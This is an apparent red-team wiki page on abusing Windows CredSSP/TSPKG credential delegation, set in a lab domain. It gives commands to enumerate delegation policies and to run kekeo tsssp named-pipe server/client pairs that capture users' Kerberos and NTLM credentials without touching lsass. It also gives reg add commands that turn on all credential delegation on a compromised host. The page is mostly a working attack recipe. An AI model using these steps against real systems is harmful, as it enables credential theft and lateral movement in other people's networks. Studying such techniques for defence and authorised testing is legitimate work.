# CredSSP / TSPKG

{% embed url="https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/" %}

## <mark style="color:red;">Credentials Delegation</mark>

Credential Delegation is a feature that allows domain administartors to authorize certain machines or to be more precise - certain SPNs, to accept delegated passwords. In other words, this means that certain services on certain machines can be set to allow users to authenticate without the need to supply their credentials interactively - almost like a Single Sign On.

## <mark style="color:red;">Exploitation</mark>

### <mark style="color:orange;">Enumerating Delegated Credentials via AD</mark>

```
gpresult /h report.html
# or Get-GPOReport if you have access to AD admin tools
```

Additionally, we can use [Parse-Polfile](https://github.com/PowerShell/GPRegistryPolicyParser) to parse the registry.pol of the linked GPO. First of, let's find the GPO that is being applied to the user spotless:

```
Get-NetGPO -UserIdentity spotless
```

and then parse the policy file:

```
Parse-PolFile -Path "\\offense.local\sysvol\offense.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol"
```

### <mark style="color:orange;">Dumping Kerberos Credentials</mark>

If credential delegation is set up, credentials can be dumped without touching lsass with a tool called kekeo.

{% embed url="https://github.com/gentilkiwi/kekeo" %}

Let's spin up a tsssp named pipe server where targets of whom the credentials we want to steal, will connect to, on the compromised pc1  (running as SYSTEM):

{% code title="pc1.lab.local" %}
```
tsssp::server
```
{% endcode %}

{% hint style="info" %}
Kekeo on pc1 must be running as NT\SYSTEM for this to work
{% endhint %}

Now, let's connect to the tsssp server on pc1 from the target computer pc2 (we want currently logged on user's from pc2 credentials to be stolen by being sent to the tsssp server on pc1 over the named pipe):

{% code title="pc2.lab.local" %}
```
tsssp::client /target:termsrv/pc1.lab.local /pipe:\\pc1.lab.local\pipe\kekeo_tsssp
```
{% endcode %}

### <mark style="color:orange;">Enumerating Delegated Credentials Locally</mark>



Once on the box, we can check if credential delegation is turned on:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation
```

#### key value should be set to 0x1.

We can then check what SPNs accept delegated credentials.

Below shows that the box we have access to is allowed to delegate credentials to all termsrv SPNs - all RDP services:

<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials

<strong>1    REG_SZ    termsrv/*</strong></code></pre>

### <mark style="color:orange;">Dumping NTLM Credentials</mark>

For the technique to work with NTLM credentials, below needs to be enabled in AD in Computer Configuration > Policies > Administrative Templates > System > Credential Delegation.

```
value = *
```

the NTLM delegated credential dumping attack can be performed locally on the target system - we only need two kekeo instances running as low privileged users, unlike with kerberos credential dumping where the tsssp server had to be running as SYSTEM.

{% code title="pc2" %}
```
tsssp::server
```
{% endcode %}

And connect to it from another console as the same user:

{% code title="pc2" %}
```
tsssp::client /target:termsrv/pc2.lab.local
```
{% endcode %}

## <mark style="color:red;">Enabling Credential Delegation</mark>

If you have admin rights on the compromised box, you can enable all credential delegation like so:

```
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d "*"
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d "*"
​
# delete all
reg delete HKLM\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /f
```
